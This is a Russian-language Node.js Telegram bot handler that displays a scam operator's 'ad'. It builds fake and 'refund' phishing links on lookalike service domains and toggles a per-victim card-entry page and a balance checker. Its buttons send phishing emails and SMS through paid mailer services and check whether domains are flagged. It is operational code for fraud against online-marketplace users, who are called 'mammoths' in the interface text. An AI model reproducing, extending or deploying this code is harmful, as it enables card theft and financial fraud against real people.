const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const { Ad } = require("../database");
const locale = require("../locale");

module.exports = async (ctx, id) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id,
        userId: ctx.from.id,
      },
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "country",
              required: true,
            },
          ],
        },
      ],
    });

    if (!ad)
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("◀️ Назад", "start")],
          ]),
        })
        .catch((err) => err);

   const fakeLinkUrl =
  ad.serviceCode === "service_eu" && ad.customLink
    ? ad.customLink
    : `https://${ad.service.domain}/${ad.id}`;     
    
const refundLinkUrl =
  ad.serviceCode === "service_eu" && ad.customLink
    ? ad.customLink.replace(`/${ad.id}`, `/refund/${ad.id}`)
    : `https://${ad.service.domain}/refund/${ad.id}`;
    const shortLinkDisplay = ad.shortLink
      ? `<a href="${ad.shortLink}">Перейти</a>\n╰ <code>${escapeHTML(
          ad.shortLink
        )}</code>`
      : `<i>отсутствует</i>`;

    const personalLinkDisplay = ad.myDomainLink
      ? `<a href="${ad.myDomainLink}">Перейти</a>\n╰ <code>${escapeHTML(
          ad.myDomainLink
        )}</code>`
      : `<i>отсутствует</i>`;
      const adLinkDisplay = ad.adLink
  ? `<a href="${ad.adLink}">Перейти</a>\n╰ <code>${escapeHTML(ad.adLink)}</code>`
  : `<i>отсутствует</i>`;

    var text = locale.myAd.text;

    text = text
      .replace(/{id}/g, `${ad.id}`)
      .replace(/{service}/g, `${ad.service.title}`)
      .replace(/{title}/g, escapeHTML(ad.title || "отсутствует"))
      .replace(/{price}/g, escapeHTML(ad.price || "отсутствует"))
      .replace(/{name}/g, escapeHTML(ad.name || "отсутствует"))
      .replace(/{address}/g, escapeHTML(ad.address || "отсутствует"))
      .replace(/{balanceChecker}/g, ad.balanceChecker ? "включён" : "выключен")
         .replace(
        /{billingStatus}/g,
        ad.billing
          ? "страница ввода карты генерируется с новым ID для каждого мамонта."
          : "выключена"
      )
      .replace(/{fakeLinkUrl}/g, fakeLinkUrl)
      .replace(/{refundLinkUrl}/g, refundLinkUrl)
      .replace(/{shortLinkDisplay}/g, shortLinkDisplay)
      .replace(/{personalLinkDisplay}/g, personalLinkDisplay)

        .replace(/{adLinkDisplay}/g, adLinkDisplay);
    const inlineButtons = [];

    const screenButtons = [];
    if (ad.service.screen3) {
      screenButtons.push(
        Markup.callbackButton("📱 Gosu Screen (3%)", `screen3_${ad.id}`)
      );
    }
    if (ad.service.screen4) {
      screenButtons.push(
        Markup.callbackButton("📱 Gosu QR (3%)", `screen4_${ad.id}`)
      );
    }
    if (screenButtons.length > 0) {
      for (let i = 0; i < screenButtons.length; i += 2) {
        inlineButtons.push(screenButtons.slice(i, i + 2));
      }
    }

    return ctx
      .replyOrEdit(text, {
        parse_mode: "HTML",
        disable_web_page_preview: true,

        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "🔍 Проверить на КТ",
              `test_domain_kt_${ad.id}`
            ),

            Markup.callbackButton(
              "🔄 Повторить создание",
              `create_link_service_${ad.serviceCode}`
            ),
          ],

          // Верхние кнопки (действия)
          ...(ad.service.code === "etsyverif_eu"
            ? [
              [
                Markup.callbackButton(
                  "📋 Скопировать объявление",
                  `return_etsy_${ad.id}`
                ),
              ],
            ]
            : ad.service.code === "service_eu"
              ? [
                [
                  Markup.callbackButton(
                    "📋 Скопировать объявление",
                    `return_service_${ad.id}`
                  ),
                ],
              ]
              : []),
          ...inlineButtons,

          ...(ad.service.screen || ad.service.screen2
            ? [
              [
                ...(ad.service.screen
                  ? [
                    Markup.callbackButton(
                      "📱 Goat QR (5%)",
                      `screen_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.screen2
                  ? [
                    [
                      Markup.callbackButton(
                        "📄 Отрисовка (2%)",
                        `screen2_${ad.id}`
                      ),
                    ],
                  ]
                  : []),
              ],
            ]
            : []),

       
          ...(ad.service.mailer6 || ad.service.mailer8|| ad.service.mailer9
            ? [
              [
                ...(ad.service.mailer6
                  ? [
                    Markup.callbackButton(
                      "✉️ CatchMe Mail (7%)",
                      `sendMail6_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.mailer8
                  ? [
                    Markup.callbackButton(
                      "✉️ Just Mail (5%)",
                      `sendMail8_${ad.id}`
                    ),
                  ]
                  : []),
                   ...(ad.service.mailer9
                  ? [
                    Markup.callbackButton(
                      "✉️ Meow Mail (4%)",
                      `sendMail9_${ad.id}`
                    ),
                  ]
                  : []),
              ],
            ]
            : []),

          ...(ad.service.mailer4 || ad.service.mailer2 || ad.service.mailer7
            ? [
              [
                ...(ad.service.mailer4
                  ? [
                    Markup.callbackButton(
                      "✉️ Inbox Mail (4%)",
                      `sendMail4_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.mailer2
                  ? [
                    Markup.callbackButton(
                      "✉️ Anafema Mail (7%)",
                      `sendMail2_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.mailer7
                  ? [
                    Markup.callbackButton(
                      "✉️ Mori Mail (5%)",
                      `sendMail7_${ad.id}`
                    ),
                  ]
                  : []),
              ],
            ]
            : []),

          ...(ad.service.mailer3 || ad.service.mailer || ad.service.mailer5
            ? [
              [
                ...(ad.service.mailer3
                  ? [
                    Markup.callbackButton(
                      "✉️ Your Mail (5%)",
                      `sendMail3_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.mailer
                  ? [
                    Markup.callbackButton(
                      "✉️ Gosu Mail (5%)",
                      `sendMail_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.mailer5
                  ? [
                    Markup.callbackButton(
                      "✉️ Hype Mail (5%)",
                      `sendMail5_${ad.id}`
                    ),
                  ]
                  : []),
              ],
            ]
            : []),

          ...(ad.service.sms || ad.service.sms2
            ? [
              [
                ...(ad.service.sms
                  ? [
                    Markup.callbackButton(
                      "💬 Moonheim SMS (7%)",
                      `sendSms_${ad.id}`
                    ),
                  ]
                  : []),
                ...(ad.service.sms2
                  ? [
                    Markup.callbackButton(
                      "💬 Depa SMS (0%)",
                      `sendSms2_${ad.id}`
                    ),
                  ]
                  : []),
              ],
            ]
            : []),

          ...(ad.service.sms3
            ? [
              [
                Markup.callbackButton(
                  "💬 Cosmic SMS (0%)",
                  `sendSms3_${ad.id}`
                ),
              ],
            ]
            : []),

          [
            Markup.callbackButton(
              `${ad.billing ? "🔴 Мультиссылка" : "🟢 Мультиссылка"}`,
              `my_ad_${ad.id}_turn_${ad.billing ? "off" : "on"}_billing`
            ),


            Markup.callbackButton(
              `${ad.balanceChecker ? "🔴 Чекер баланса" : "🟢 Чекер баланса"
              }`,
              `my_ad_${ad.id}_turn_${ad.balanceChecker ? "off" : "on"
              }_balanceChecker`
            ),
          ],
          [
            Markup.callbackButton(
              "✏️ Редактировать объявление",
              `edit_ad_${ad.id}`
            ),
          ],

          [
            Markup.callbackButton(
              "❌ Удалить объявление",
              `delete_ad_${ad.id}`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", "my_ads_1")],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
